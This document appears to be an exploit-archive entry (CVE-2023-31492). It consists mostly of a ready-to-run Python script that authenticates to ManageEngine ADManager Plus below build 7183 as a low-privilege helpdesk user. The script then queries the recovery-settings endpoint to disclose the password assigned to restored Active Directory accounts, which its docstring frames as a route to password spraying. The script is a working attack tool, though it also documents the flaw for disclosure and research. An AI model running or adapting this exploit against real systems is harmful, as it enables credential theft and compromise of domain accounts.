@@ -1,0 +1,89 @@
+id: 39331
+date: 02/13/2024
+title: ManageEngine ADManager Plus Build < 7183 - Recovery Password Disclosure Exploit
+author: Metin Yunus Kandemir
+cves: CVE-2023-31492
+
+# Exploit Title: ManageEngine ADManager Plus Build < 7183 - Recovery Password Disclosure
+# Exploit Author: Metin Yunus Kandemir
+# Vendor Homepage: https://www.manageengine.com/
+# Software Link: https://www.manageengine.com/products/ad-manager/
+# Details: https://docs.unsafe-inline.com/0day/manageengine-admanager-plus-build-less-than-7183-recovery-password-disclosure-cve-2023-31492
+# Details: https://github.com/passtheticket/vulnerability-research/blob/main/manage-engine-apps/admanager-recovery-password-disclosure.md
+# Version: ADManager Plus Build < 7183
+# Tested against: Build 7180
+# CVE: CVE-2023-31492
+
+import argparse
+import requests
+import urllib3
+import sys
+
+"""
+The Recovery Settings helps you configure the restore and recycle options pertaining to the objects in the domain you wish to recover. 
+When deleted user accounts are restored, defined password is set to the user accounts. 
+Helpdesk technician that has not privilege for backup/recovery operations can view the password and then compromise restored user accounts conducting password spraying attack in the Active Directory environment.
+"""
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def getPass(target, auth, user, password):
+    with requests.Session() as s:
+        if auth.lower() == 'admanager':
+            auth = 'ADManager Plus Authentication'
+        data = {
+            "is_admp_pass_encrypted": "false",
+            "j_username": user,
+            "j_password": password,
+            "domainName": auth,
+            "AUTHRULE_NAME": "ADAuthenticator"
+        }
+        # Login
+        url = target + 'j_security_check?LogoutFromSSO=true'
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+        req = s.post(url, data=data, headers=headers, allow_redirects=True, verify=False)
+        if 'Cookie' in req.request.headers:
+            print('[+] Authentication successful!')
+        elif req.status_code == 200:
+            print('[-] Invalid login name/password!')
+            sys.exit(0)
+        else:
+            print('[-] Something went wrong!')
+            sys.exit(1)
+
+        # Fetching recovery password
+        for i in range(1, 6):
+            print('[*] Trying to fetch recovery password for domainId: %s !' % i)
+            passUrl = target + 'ConfigureRecoverySettings/GET_PASS?req=%7B%22domainId%22%3A%22' + str(i) + '%22%7D'
+            passReq = s.get(passUrl, headers=headers, allow_redirects=False, verify=False)
+            if passReq.content:
+                print(passReq.content)
+
+
+def main():
+    arg = get_args()
+    target = arg.target
+    auth = arg.auth
+    user = arg.user
+    password = arg.password
+    getPass(target, auth, user, password)
+
+
+def get_args():
+    parser = argparse.ArgumentParser(
+        epilog="Example: exploit.py -t https://target/ -a unsafe.local -u operator1 -p operator1")
+    parser.add_argument('-t', '--target', required=True, action='store', help='Target url')
+    parser.add_argument('-a', '--auth', required=True, action='store',
+                        help='If you have credentials of the application user, type admanager. If you have credentials of the domain user, type domain DNS name of the target domain.')
+    parser.add_argument('-u', '--user', required=True, action='store')
+    parser.add_argument('-p', '--password', required=True, action='store')
+    args = parser.parse_args()
+    return args
+
+
+main()
+
+#  0day.today [2024-02-19]  #
